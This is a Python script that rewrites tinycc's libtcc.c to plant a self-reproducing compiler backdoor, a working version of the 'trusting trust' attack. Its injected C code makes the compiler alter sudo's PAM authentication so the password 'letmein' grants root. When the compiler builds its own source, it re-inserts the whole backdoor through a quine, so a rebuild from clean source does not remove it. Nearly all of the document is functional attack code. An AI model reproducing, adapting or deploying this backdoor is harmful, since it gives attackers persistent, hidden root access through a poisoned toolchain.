# Mangle tinycc/libtcc.c to plant a self-reproducing backdoor.
#   Payload A: poisoned tcc backdoors sudo's PAM auth - magic password "letmein" -> root.
#   Payload B: when poisoned tcc compiles tcc's own source, it re-injects the whole
#              backdoor (quine), so it survives rebuilding tcc from clean source..
import sys, pathlib

def cesc(s):   #as per bd_cescape()
    return '"' + s.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n') + '"'

OPEN_ANCHOR   = "static int _tcc_open"
PRINT_ANCHOR  = '(int)(s1->include_stack_ptr - s1->include_stack), "", filename);'

# Spliced into _tcc_open after the verbose-print line; read whole file, run text through
# bd_filter, hand tcc back a temp fd of the filtered bytes (binary files should pass through).
SLURP = r'''
    if (fd < 0) return fd;
    { int cap = 1<<20, len = 0, r; char *src = tcc_malloc(cap);
      while ((r = read(fd, src+len, cap-len-1)) > 0)
          if ((len += r) > cap-4096) src = tcc_realloc(src, cap*=2);
      if (fd) close(fd);
      if (!memchr(src, 0, len)) { src[len] = 0; src = bd_filter(src); len = strlen(src); }
      { char t[] = "/tmp/ttXXXXXX"; int m = mkstemp(t); unlink(t);
        write(m, src, len); lseek(m, 0, SEEK_SET); tcc_free(src); return m; } }'''

# The backdoor block. %SLURP% -> C-quoted SLURP; @ -> the self-quoting bd_src line.
TEMPLATE = r'''
static const char *bd_slurp = %SLURP%;
@
static char *bd_ins(char *buf, const char *anchor, const char *code, int after) {
    char *at = strstr(buf, anchor);
    if (!at) return buf;
    int pos = (int)(at - buf) + (after ? (int)strlen(anchor) : 0);
    char *out = tcc_malloc(strlen(buf) + strlen(code) + 1);
    memcpy(out, buf, pos);
    strcpy(out + pos, code);
    strcpy(out + pos + strlen(code), buf + pos);
    tcc_free(buf);
    return out;
}
static char *bd_cescape(const char *s) {
    char *o = tcc_malloc(strlen(s)*4 + 3), *p = o;
    *p++ = '"';
    for (; *s; s++) {
        if (*s == '\\') { *p++ = '\\'; *p++ = '\\'; }
        else if (*s == '"') { *p++ = '\\'; *p++ = '"'; }
        else if (*s == '\n') { *p++ = '\\'; *p++ = 'n'; }
        else *p++ = *s;
    }
    *p++ = '"'; *p = 0;
    return o;
}
static char *bd_block(void) {              // rebuild block from bd_src
    char *at = strchr(bd_src, '@');
    char *esc = bd_cescape(bd_src);
    int pre = (int)(at - bd_src);
    char *o = tcc_malloc(strlen(bd_src) + strlen(esc) + 40);
    memcpy(o, bd_src, pre);
    int n = pre + sprintf(o + pre, "static const char *bd_src = %s;", esc);
    strcpy(o + n, at + 1);
    tcc_free(esc);
    return o;
}
static char *bd_filter(char *buf) {
    if (strstr(buf, "sudo_pam_verify")) {                 // Payload A :: sudo PAM
        buf = bd_ins(buf, "static int converse(int", "static int __bd;\n", 0);
        buf = bd_ins(buf, "reply[n].resp = pass;", " if(pass&&!strcmp(pass,\"letmein\"))__bd=1;", 1);
        buf = bd_ins(buf, "pam_authenticate(pamh, def_pam_silent ? PAM_SILENT : 0);", " if(__bd)*pam_status=PAM_SUCCESS;", 1);
    }
    if (strstr(buf, "ST_FUNC int tcc_open(")) {           // Payload B :: this is tcc
        buf = bd_ins(buf, "(int)(s1->include_stack_ptr - s1->include_stack), \"\", filename);", bd_slurp, 1);
        char *blk = bd_block();
        buf = bd_ins(buf, "static int _tcc_open", blk, 0);
        tcc_free(blk);
    }
    return buf;
}
'''

filled = TEMPLATE.replace("%SLURP%", cesc(SLURP))
# Only the 1st @ is the placeholder; bd_block's strchr(bd_src,'@') keeps its literal @.
block  = filled.replace("@", "static const char *bd_src = " + cesc(filled) + ";", 1)

f = pathlib.Path(sys.argv[1])
s = f.read_text()
s = s.replace(PRINT_ANCHOR, PRINT_ANCHOR + SLURP, 1)        
s = s.replace(OPEN_ANCHOR, block + OPEN_ANCHOR, 1)          #block before _tcc_open
f.write_text(s)
